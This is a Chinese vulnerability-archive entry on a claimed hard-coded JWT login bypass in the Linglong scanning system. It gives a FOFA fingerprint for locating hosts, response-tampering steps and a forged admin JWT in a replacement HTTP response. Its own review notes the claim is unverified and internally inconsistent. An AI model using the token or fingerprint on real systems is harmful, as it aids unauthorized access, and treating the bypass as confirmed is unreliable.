---
source: "wy876 漏洞文库"
title: "玲珑linglong扫描系统 JWT硬编码密钥登录绕过声称"
product: "玲珑linglong扫描系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，HS256固定token/密钥来源未给"
prerequisites: "通过替换登录响应演示"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pb37q4h4d15zfwg1"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%8E%B2%E7%8F%91/linglong%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8JWT%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"684115083\""
fofa_unverified: "icon_hash="
id: "vw-bbdbfecf62d30c71b42dfbd7"
entity_id: "ve-bbdbfecf62d30c71b42dfbd7"
schema_version: "1"
---

# 玲珑linglong扫描系统 JWT硬编码密钥登录绕过声称

## 条目说明

- 对象与具体问题：玲珑linglong扫描系统；JWT硬编码密钥登录绕过声称
- 版本、配置及部署条件：版本未知，HS256固定token/密钥来源未给
- 认证与权限前提：通过替换登录响应演示
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只给签名JWT而不提供密钥/代码来源或签发推导，不能证明密钥硬编码
- 修改本地响应只能证明UI状态，需服务端API接受伪造token验证；未提供
- 响应code200但msg请求失败，Content-Length43远短于JSON，样例不一致
- JWT含长效exp/username但不等于通用有效，CORS星号加credentials也不是认证证据；缺修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
linglong扫描系统 存在密钥硬编码漏洞，未经身份验证验证得攻击者可构造JWT密钥绕着身份认证直接登录系统后台，造成信息泄露，使系统处于极不安全的状态。

## 二、影响版本
+ linglong扫描系统

## 三、资产测绘
+ fofa`icon_hash="684115083"`
+ 特征

## 四、漏洞复现
1、登陆时抓包


2、拦截返回包


3、替换返回包为如下内容：


```plain
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,AccessToken,X-CSRF-Token, Authorization,Token,X-TOKEN
Access-Control-Allow-Methods: POST, GET,PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type
Content-Type: application/json; charset=utf-8
Date: Fri, 17 May 2024 09:39:26 GMT
Content-Length: 43
Connection: close

{"code":200,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwiZXhwIjoxOTk5OTk5OTk5LCJpc3MiOiJsaW5nbG9uZyJ9.xAJf-cktK9WD5vXpfwTaIs6fSqVGZfG5BGnqDZwruMY"},"msg":"请求失败"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pb37q4h4d15zfwg1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
